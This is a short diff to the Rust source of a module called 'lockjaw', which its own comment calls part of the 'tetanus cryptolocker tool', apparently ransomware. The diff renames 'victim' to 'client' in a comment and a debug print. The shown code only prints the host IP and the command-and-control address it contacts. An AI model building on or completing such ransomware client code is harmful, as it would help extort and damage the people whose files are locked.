@@ -1,4 +1,4 @@
-// lockjaw is the victim module for the tetanus cryptolocker tool
+// lockjaw is the client module for the tetanus cryptolocker tool
 const DBUG: i32 = 1;
 
 extern crate std;
@@ -16,7 +16,7 @@ use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
 pub fn init(c2: std::string::String) {
     if DBUG == 1 {
         println!("lockjaw module initialized!");
-        println!("victim: {} ", get_ip());
+        println!("client: {} ", get_ip());
         println!("talking to: {} ", c2);
     }
 }
